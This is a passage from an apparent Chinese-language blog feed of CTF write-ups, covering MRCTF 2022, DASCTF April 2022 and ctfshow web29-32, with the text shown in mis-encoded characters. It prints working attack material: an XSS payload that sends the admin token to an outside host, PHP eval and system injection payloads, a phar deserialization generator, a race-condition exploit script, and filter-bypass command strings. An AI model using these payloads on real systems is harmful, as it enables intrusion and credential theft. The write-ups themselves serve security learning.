location.href="http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri="+window.location.href&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>data:,<span class="token punctuation">"</span>onerror=<span class="token punctuation">"</span>eval(scrip.innerText)<span class="token punctuation">'</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MyImg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>ç„¶åæˆ‘ä»¬å°†uuidæäº¤ç»™ç®¡ç†å‘˜</p><p>å°±å¯ä»¥åœ¨æœåŠ¡å™¨çš„æ—¥å¿—é‡Œæ‰¾åˆ°ç®¡ç†å‘˜çš„token</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230709447.png" alt="image-20220425230709447"></p><p>å›åˆ°loginè·¯å¾„ä¸‹æŠŠtokenæ¢æ‰å°±è¡Œäº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230756857.png" alt="image-20220425230756857"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230836819.png" alt="image-20220425230836819"></p><p>è¿™é‡Œxssçš„åˆ©ç”¨å¥½åƒä¸»è¦æ˜¯Dom ClobberingæŠ€æœ¯æ¥è§¦å‘çš„domå‹xss</p><p>ï¼ˆè¯´èµ·æ¥å› ä¸ºdomå‹xssåˆ©ç”¨çš„å°‘ï¼Œæˆ‘è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§</p><p><a href="https://xz.aliyun.com/t/7329">ä½¿ç”¨ Dom Clobbering æ‰©å±• XSS - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>é™„ä¸€ä¸ªå‡ºé¢˜äººå†™çš„</p><p><a href="https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/">MRCTF2022_God_of_GPA_WP - Welcome to fallingblog (ibukifalling.github.io)</a></p><p>å‘ç°å¥½åƒåªæœ‰è¿™ä¸¤ä¸ªèƒ½å¤ç°ã€‚ã€‚ã€‚å…¶ä»–çš„éƒ½æ˜¯Javaå®‰å…¨äº†ï¼Œæ”¾ä¸€ä¸‹y4å¸ˆå‚…çš„javaé¢˜çš„wpï¼Œä»¥åå­¦ä¼šJavaä¹‹åå†çœ‹</p><p><a href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/">2022MRCTF-Javaéƒ¨åˆ† | Y4tacker&#39;s Blog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF Aprå¤ç°</title>
      <link href="/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>çº¯å¤ç°äº†ï¼Œæ²¡æ‰“</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>å½“æ—¶å°±çœ‹äº†çœ‹è¿™ä¸€ä¸ªmiscï¼Œè§‰å¾—åº”è¯¥æ˜¯æœ‰æ–‡ä»¶ï¼Œä½†æ˜¯æ²¡æå‡ºæ¥</p><h2 id="SimpleFlow"><a href="#SimpleFlow" class="headerlink" title="SimpleFlow"></a>SimpleFlow</h2><p>ä¸€é“æµé‡åˆ†æé¢˜ï¼Œç”¨wiresharkæ‰“å¼€ï¼Œç„¶åè¿½è¸ªä¸€ä¸‹tcpæµï¼Œçœ‹èµ·æ¥æƒ³æ˜¯èšå‰‘çš„æµé‡ç‰¹å¾ï¼Œåœ¨ç¬¬52æµçœ‹åˆ°äº†flagçš„zip</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424214710424.png" alt="image-20220424214710424"></p><p>å˜æˆåŸå§‹æ•°æ®</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424214922714.png" alt="image-20220424214922714"></p><p>å¾ˆæ˜æ˜¾çš„504bçš„zipæ–‡ä»¶å¤´ï¼Œå¤åˆ¶å‡ºæ¥æ”¾010é‡Œå¦å­˜ä¸ºæ‹¿åˆ°zipæ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦å¯†ç ï¼Œå†çœ‹çœ‹ç¬¬50æµ</p><p>urlè§£ç å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215052128.png" alt="image-20220424215052128"></p><p>æˆ‘ä»¬ç›´æ¥æ‰¾m8f8d9db647ecdå¯¹åº”çš„å€¼ï¼Œç„¶åæŠŠå®ƒbase64è§£ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215126797.png" alt="image-20220424215126797"></p><p>ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰æ‰¾åˆ°å¯†ç ï¼Œè€Œæˆ‘ä»¬å‘ç°urlè§£ç åçš„æ•°æ®è¿˜æœ‰å…¶ä»–çš„å‚æ•°ï¼Œä½†æ˜¯å¹¶ä¸èƒ½ç›´æ¥base64è§£ç ï¼Œè¿™æ˜¯å› ä¸ºä¼ å‚ä¹‹åè¢«substrå»æ‰äº†å‰é¢ä¸¤ä½</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215250325.png" alt="image-20220424215250325"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ‰å‰ä¸¤ä½ä¹‹åå†è§£ç ï¼Œåœ¨g479cf6f058cf8å¯¹åº”çš„Y2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vdä¸­å¾—åˆ°æˆ‘ä»¬çš„å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215358355.png" alt="image-20220424215358355"></p><pre class="language-none"><code class="language-none">PaSsZiPWorD</code></pre><p>è§£å‹ç¼©ï¼Œæ‹¿åˆ°flag</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><p>è¿™é¢˜çœ‹èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä½†æ˜¯å¦‚æœè‡ªå·±ä¸€æ­¥ä¸€æ­¥è°ƒè¯•ï¼Œè¿˜æ˜¯å¾ˆå¥½å‡ºçš„</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpspl_autoload_register(function($class)&#123;    require(&quot;.&#x2F;class&#x2F;&quot;.$class.&quot;.php&quot;);&#125;);highlight_file(__FILE__);error_reporting(0);$action &#x3D; $_GET[&#39;action&#39;];$properties &#x3D; $_POST[&#39;properties&#39;];class Action&#123;    public function __construct($action,$properties)&#123;        $object&#x3D;new $action();        foreach($properties as $name&#x3D;&gt;$value)            $object-&gt;$name&#x3D;$value;        $object-&gt;run();    &#125;&#125;new Action($action,$properties);?&gt;</code></pre><p>å…ˆçœ‹ç¬¬ä¸€æ®µï¼Œactionæ˜¯ç±»åï¼Œpropertiesçš„keyæ˜¯å±æ€§ï¼Œvalueæ˜¯å€¼</p><p>æ‰€ä»¥æˆ‘ä»¬çš„èµ‹å€¼å°±è¦ä¾é properties</p><p>ç„¶åè°ƒç”¨actionå®šä¹‰çš„ç±»é‡Œçš„runæ–¹æ³•</p><p>runæ–¹æ³•åœ¨ListView.phpé‡Œ</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass ListView&#123;    public $tagName&#x3D;&#39;div&#39;;    public $template &#x3D; &#39;flag&#39;;    public function run()    &#123;        echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\n&quot;;        $this-&gt;renderContent();        echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\n&quot;;    &#125;    public function renderContent()    &#123;        ob_start();        echo preg_replace_callback(&quot;&#x2F;&#123;(\w+)&#125;&#x2F;&quot;,array($this,&#39;renderSection&#39;),$this-&gt;template);        ob_end_flush();    &#125;    protected function renderSection($matches)    &#123;        $method&#x3D;&#39;render&#39;.$matches[1];        if(method_exists($this,$method))        &#123;            $this-&gt;$method();            $html&#x3D;ob_get_contents();            ob_clean();            return $html;        &#125;        else            return $matches[0];    &#125;&#125;</code></pre><p>run-&gt;renderContent-&gt;renderSection</p><p>åœ¨renderContentä¸­åˆ©ç”¨preg_replace_callbackå¯¹templateä¸­çš„å€¼è¿›è¡Œäº†æ­£åˆ™åŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°{\w+}å°±è°ƒç”¨renderSectionï¼Œè€Œå°†åŒ¹é…åˆ°çš„ç»“æœè¿›è¡Œå‚æ•°ä¼ å…¥renderSectionï¼Œè€Œåœ¨renderSectionä¸­å°†$matches[1]ä¸renderè¿›è¡Œäº†ä¸€ä¸ªæ‹¼æ¥ï¼Œå¹¶æ£€æµ‹æ˜¯å¦æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œæœ‰å°±å»æ‰§è¡Œå®ƒã€‚</p><p>æˆ‘ä»¬å¯ä»¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹åŒ¹é…åˆ°çš„å‚æ•°matchesæ˜¯ä»€ä¹ˆå½¢å¼çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424230946517.png" alt="image-20220424230946517"></p><p>ç»è¿‡è°ƒè¯•æˆ‘ä»¬å‘ç°ï¼Œå¦‚æœtemplateæ˜¯{TableBody}ï¼Œé‚£ä¹ˆç»è¿‡renderSectionï¼Œå°±ä¼šè°ƒç”¨TestViewé‡Œçš„renderTableBodyæ–¹æ³•</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass TestView extends ListView&#123;    const FILTER_POS_HEADER&#x3D;&#39;header&#39;;    const FILTER_POS_BODY&#x3D;&#39;body&#39;;    public $columns&#x3D;array();        public $rowCssClass&#x3D;array(&#39;odd&#39;,&#39;even&#39;);        public $rowCssClassExpression;        public $rowHtmlOptionsExpression;        public $selectableRows&#x3D;1;    public $data&#x3D;array(1,2,3);    public $filterSelector&#x3D;&#39;&#123;filter&#125;&#39;;        public $filterCssClass&#x3D;&#39;filters&#39;;        public $filterPosition&#x3D;&#39;body&#39;;        public $filter;        public $hideHeader&#x3D;false;            public function renderTableHeader()    &#123;        if(!$this-&gt;hideHeader)        &#123;            echo &quot;&lt;thead&gt;\n&quot;;            if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER)                $this-&gt;renderFilter();            if($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY)                $this-&gt;renderFilter();            echo &quot;&lt;&#x2F;thead&gt;\n&quot;;        &#125;        elseif($this-&gt;filter!&#x3D;&#x3D;null &amp;&amp; ($this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_HEADER || $this-&gt;filterPosition&#x3D;&#x3D;&#x3D;self::FILTER_POS_BODY))        &#123;            echo &quot;&lt;thead&gt;\n&quot;;            $this-&gt;renderFilter();            echo &quot;&lt;&#x2F;thead&gt;\n&quot;;        &#125;    &#125;        public function renderFilter()    &#123;        if($this-&gt;filter!&#x3D;&#x3D;null)        &#123;            echo &quot;&lt;tr class&#x3D;\&quot;&#123;$this-&gt;filterCssClass&#125;\&quot;&gt;\n&quot;;            echo &quot;&lt;&#x2F;tr&gt;\n&quot;;        &#125;    &#125;        public function renderTableRow($row)    &#123;        $htmlOptions&#x3D;array();        if($this-&gt;rowHtmlOptionsExpression!&#x3D;&#x3D;null)        &#123;            $data&#x3D;$this-&gt;data[$row];            $options&#x3D;$this-&gt;evaluateExpression($this-&gt;rowHtmlOptionsExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data));            if(is_array($options))                $htmlOptions &#x3D; $options;        &#125;        if($this-&gt;rowCssClassExpression!&#x3D;&#x3D;null)        &#123;            $data&#x3D;$this-&gt;dataProvider-&gt;data[$row];            $class&#x3D;$this-&gt;evaluateExpression($this-&gt;rowCssClassExpression,array(&#39;row&#39;&#x3D;&gt;$row,&#39;data&#39;&#x3D;&gt;$data));        &#125;        elseif(is_array($this-&gt;rowCssClass) &amp;&amp; ($n&#x3D;count($this-&gt;rowCssClass))&gt;0)            $class&#x3D;$this-&gt;rowCssClass[$row%$n];        if(!empty($class))        &#123;            if(isset($htmlOptions[&#39;class&#39;]))                $htmlOptions[&#39;class&#39;].&#x3D;&#39; &#39;.$class;            else                $htmlOptions[&#39;class&#39;]&#x3D;$class;        &#125;    &#125;    public function renderTableBody()    &#123;        $data&#x3D;$this-&gt;data;        $n&#x3D;count($data);        echo &quot;&lt;tbody&gt;\n&quot;;        if($n&gt;0)        &#123;            for($row&#x3D;0;$row&lt;$n;++$row)                $this-&gt;renderTableRow($row);        &#125;        else        &#123;            echo &#39;&lt;tr&gt;&lt;td colspan&#x3D;&quot;&#39;.count($this-&gt;columns).&#39;&quot; class&#x3D;&quot;empty&quot;&gt;&#39;;            echo &quot;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;\n&quot;;        &#125;        echo &quot;&lt;&#x2F;tbody&gt;\n&quot;;    &#125;&#125;</code></pre><p>renderTableBody-&gt;renderTableRow-&gt;evaluateExpressionè€Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è°ƒç”¨evaluateExpressioné‡Œçš„evalæ¥å‘½ä»¤æ‰§è¡Œ</p><pre class="language-none"><code class="language-none">public function evaluateExpression($_expression_,$_data_&#x3D;array())&#123;    if(is_string($_expression_))    &#123;        extract($_data_);        return eval(&#39;return &#39;.$_expression_.&#39;;&#39;);    &#125;    else    &#123;        $_data_[]&#x3D;$this;        return call_user_func_array($_expression_, $_data_);    &#125;&#125;</code></pre><p>è¦æƒ³ä»renderTableBodyåˆ°renderTableRowï¼Œå°±è¦ç»™dataèµ‹å€¼ï¼Œè®©å®ƒä¸ä¸ºç©º</p><p>è¦æƒ³ä»renderTableRowåˆ°evaluateExpressionï¼Œå°±è¦ç»™renderTableRowèµ‹å€¼ï¼Œè®©å®ƒä¸ä¸ºç©ºï¼Œè€Œè¿™ä¸ªå€¼ä¼šç›´æ¥ä¼ ç»™evaluateExpressionä¸­çš„evalæ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>æœ€ç»ˆpayload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424233833974.png" alt="image-20220424233833974"></p><p>è¿™é‡Œæ˜¯TestViewè€Œä¸æ˜¯ListViewåº”è¯¥æ˜¯å› ä¸ºç»§æ‰¿çš„é—®é¢˜ï¼Œå­ç±»å¯ä»¥è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•</p><h2 id="soeasy-php"><a href="#soeasy-php" class="headerlink" title="soeasy_php"></a>soeasy_php</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425155742598.png" alt="image-20220425155742598"></p><p>æºç é‡Œæœ‰ä¸ªæ³¨é‡Šçš„æ›´æ¢å¤´åƒçš„æŒ‰é’®ï¼ŒæŠŠæ³¨é‡Šå»æ‰æŠ“ä¸€ä¸‹åŒ…</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425155843195.png" alt="image-20220425155843195"></p><p>è¿™é‡Œå­˜åœ¨ä¸¤ä¸ªå‚æ•°ï¼Œç»è¿‡æµ‹è¯•å‘ç°pngè¿™é‡Œæœ‰ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425161103105.png" alt="image-20220425161103105"></p><p>è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œç›¸å¯¹è·¯å¾„è®¿é—®çš„æ—¶å€™ä¼š404</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425161022803.png" alt="image-20220425161022803"></p><p>edit.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpini_set(&quot;error_reporting&quot;,&quot;0&quot;);class flag&#123;    public function copyflag()&#123;        exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;ä»¥rootæƒé™å¤åˆ¶&#x2F;flag åˆ° &#x2F;tmp&#x2F;flag.txtï¼Œå¹¶chown www-data:www-data &#x2F;tmp&#x2F;flag.txt        echo &quot;SFTQL&quot;;    &#125;    public function __destruct()&#123;        $this-&gt;copyflag();    &#125;&#125;function filewrite($file,$data)&#123;        unlink($file);        file_put_contents($file, $data);&#125;if(isset($_POST[&#39;png&#39;]))&#123;    $filename &#x3D; $_POST[&#39;png&#39;];    if(!preg_match(&quot;&#x2F;:|phar|\&#x2F;\&#x2F;|php&#x2F;im&quot;,$filename))&#123;        $f &#x3D; fopen($filename,&quot;r&quot;);        $contents &#x3D; fread($f, filesize($filename));        if(strpos($contents,&quot;flag&#123;&quot;) !&#x3D;&#x3D; false)&#123;            filewrite($filename,&quot;Don&#39;t give me flag!!!&quot;);        &#125;    &#125;    if(isset($_POST[&#39;flag&#39;])) &#123;        $flag &#x3D; (string)$_POST[&#39;flag&#39;];        if ($flag &#x3D;&#x3D; &quot;Give me flag&quot;) &#123;            filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, &quot;Don&#39;t give me flag&quot;);            sleep(2);            die(&quot;no no no !&quot;);        &#125; else &#123;            filewrite(&quot;&#x2F;tmp&#x2F;flag.txt&quot;, $flag);  &#x2F;&#x2F;ä¸ç»™æˆ‘çœ‹æˆ‘è‡ªå·±å†™ä¸ªflagã€‚        &#125;        $head &#x3D; &quot;uploads&#x2F;head.png&quot;;        unlink($head);        if (symlink($filename, $head)) &#123;            echo &quot;æˆåŠŸæ›´æ¢å¤´åƒ&quot;;        &#125; else &#123;            unlink($filename);            echo &quot;éæ­£å¸¸æ–‡ä»¶ï¼Œå·²è¢«åˆ é™¤&quot;;        &#125;;    &#125;&#125;</code></pre><p>çœ‹åˆ°__destructè¿™ç§é­”æœ¯æ–¹æ³•å’Œpreg_matché‡Œçš„pharå°±æ„Ÿè§‰åƒä¸€ä¸ªpharååºåˆ—åŒ–</p><pre class="language-none"><code class="language-none">class flag&#123;    public function copyflag()&#123;        exec(&quot;&#x2F;copyflag&quot;); &#x2F;&#x2F;ä»¥rootæƒé™å¤åˆ¶&#x2F;flag åˆ° &#x2F;tmp&#x2F;flag.txtï¼Œå¹¶chown www-data:www-data &#x2F;tmp&#x2F;flag.txt        echo &quot;SFTQL&quot;;    &#125;    public function __destruct()&#123;        $this-&gt;copyflag();    &#125;&#125;$a &#x3D; new flag();$phar &#x3D; new Phar(&quot;exp.phar&quot;); &#x2F;&#x2F;.pharæ–‡ä»¶$phar-&gt;startBuffering();$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;å›ºå®šçš„$phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();</code></pre><p>ç„¶åæ˜¯æ¡ä»¶ç«äº‰ï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425185506176.png" alt="image-20220425185506176"></p><pre class="language-none"><code class="language-none">from time import sleepimport requestsimport threadingreq &#x3D; requests.session()url1 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;uploads&#x2F;head.png&#39;url2 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;edit.php&#39;data1 &#x3D; &#123;    &#39;png&#39;: &#39;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;91fd0f2420aed857ed981856761afac6.png&#39;,    &#39;flag&#39;: &#39;&#39;&#125;data2 &#x3D; &#123;    &#39;png&#39;: &#39;&#x2F;tmp&#x2F;flag.txt&#39;,    &#39;flag&#39;: &#39;&#39;&#125;def unlink():    req.post(url2, data1)def symlink():    req.post(url2, data2)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    for _ in range(10):        t1 &#x3D; threading.Thread(target&#x3D;unlink, args&#x3D;())        t2 &#x3D; threading.Thread(target&#x3D;symlink, args&#x3D;())        t1.start()        t2.start()    while True:        # getflag        flag &#x3D; req.get(url1).text        if &quot;flag&quot; in flag:            print(flag)            break        elif &#39;429&#39; in flag:            sleep(5)            print(&#39;wait!&#39;)</code></pre><p>æ¡ä»¶ç«äº‰è¿™ä¸œè¥¿ã€‚ã€‚ã€‚æ„Ÿè§‰æŒºç„å­¦çš„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425185118218.png" alt="image-20220425185118218"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220425185753430.png" alt="image-20220425185753430"></p><h2 id="warmup-java"><a href="#warmup-java" class="headerlink" title="warmup-java"></a>warmup-java</h2><p>javaè¿˜æ²¡å­¦ï¼Œè€Œä¸”ä¹Ÿæ²¡æ‰¾åˆ°wpï¼Œå…ˆç•™ä¸ªå‘</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h2><p>ç®€å•çš„rsa</p><pre class="language-python" data-language="python"><code class="language-python">import randomimport hashlibflag &#x3D; &#39;xxxxxxxxxxxxxxxxxxxx&#39;key &#x3D; random.randint(1,10)for i in range(len(flag)):crypto +&#x3D; chr(ord(flag[i])^key)m &#x3D; cryptoçš„asciiåå…­è¿›åˆ¶e &#x3D; random.randint(1,100)print(hashlib.md5(e))p &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319q &#x3D; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxn &#x3D; p*qc &#x3D; pow(m,e,n)print(n)print(c)#37693cfc748049e45d87b8c7d8b9aacd#4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523#c&#x3D;3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397</code></pre><p>å·²çŸ¥pï¼Œnï¼Œcå’Œeçš„md5å€¼</p><p>çˆ†ç ´ä¸€ä¸‹å¾—åˆ°e=23</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibfor i in range(1,1000000000):    res &#x3D; hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest()    if res &#x3D;&#x3D; &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;:        print(str(i))        print(res)</code></pre><p>c=3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397<br>p=64310413306776406422334034047152581900365687374336418863191177338901198608319<br>q=65267138038038699886916162739434586079731613825212388229424706115289974540917<br>e=23</p><p>ç„¶åç›´æ¥æŠ„ä¸ªrsaçš„è„šæœ¬æ”¹æ”¹å°±è¡Œ</p><pre class="language-none"><code class="language-none">import libnumfrom Crypto.Util.number import long_to_bytesc &#x3D; 3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397n &#x3D; 4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523# n &#x3D; int(&quot;&quot;,16)e &#x3D; 23# e &#x3D; int(&quot;&quot;,16)q &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319p &#x3D; 65267138038038699886916162739434586079731613825212388229424706115289974540917d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))m &#x3D; pow(c, d, n)  # m çš„åè¿›åˆ¶å½¢å¼crypto &#x3D; long_to_bytes(m)  # mæ˜æ–‡print(crypto.decode(&#39;utf-8&#39;))# key &#x3D; random.randint(0,11)# for i in range(len(crypto)):#  string +&#x3D; chr(ord(crypto[i])^key)for key in range(1,10):    print(&#39;&#39;)    for i in range(len(crypto)):        print(chr(crypto[i]^key),end&#x3D;&#39;&#39;)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow web</title>
      <link href="/2022/04/24/ctfshow%20web/"/>
      <url>/2022/04/24/ctfshow%20web/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;system(ls);?c&#x3D;system(&#39;cat f?ag.php&#39;);&#x2F;&#x2F;é€šé…ç¬¦ç›´æ¥ç»•</code></pre><h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo &#96;ls&#96;;?c&#x3D;echo &#96;cat f*&#96;;&#x2F;&#x2F;åå¼•å·å†…è”æ‰§è¡Œ</code></pre><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;echo&#96;ls&#96;;?c&#x3D;echo%09&#96;tac%09fla*&#96;;&#x2F;&#x2F;è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½†æ˜¯å¯ä»¥ç”¨%09ç»•è¿‡çœ‹hintæ„Ÿè§‰é¢„æœŸè§£åº”è¯¥æ˜¯æ— å‚æ•°çš„rce ?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv())))));?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\.| |\&#39;|\&#96;|echo|\;|\(&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;phpçš„æœ€åä¸€è¡Œä»£ç å¯ä»¥ä¸ç”¨åˆ†å·åˆ†è¡Œc&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;ç”¨çŸ­æ ‡ç­¾å†å†™æ®µphpä¹Ÿä¸€æ ·</code></pre><p>phpä¼ªåè®®é€šå¸¸ç”¨äºæ–‡ä»¶åŒ…å«ä¸­ï¼Œphpä¸­æ–‡ä»¶åŒ…å«çš„å‡½æ•°æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚ include includeã€requireã€include_onceã€require_onceã€highlight_fileã€show_sourceã€file_get_contentsã€fopenã€fileã€readfile</p><p>è¿˜å¯ä»¥ç”¨dataä¼ªåè®®</p><p>dataä¼ªåè®®å°±æ˜¯æŠŠä¸€äº›ä½“é‡æ¯”è¾ƒå°çš„æ•°æ®ç›´æ¥åµŒå…¥åœ¨é¡µé¢é‡Œï¼Œè€Œä¸ä½¿ç”¨å¤–éƒ¨é“¾æ¥ã€‚<code>data:text/plain</code>æ˜¯åµŒå…¥æ–‡æœ¬</p><p><img 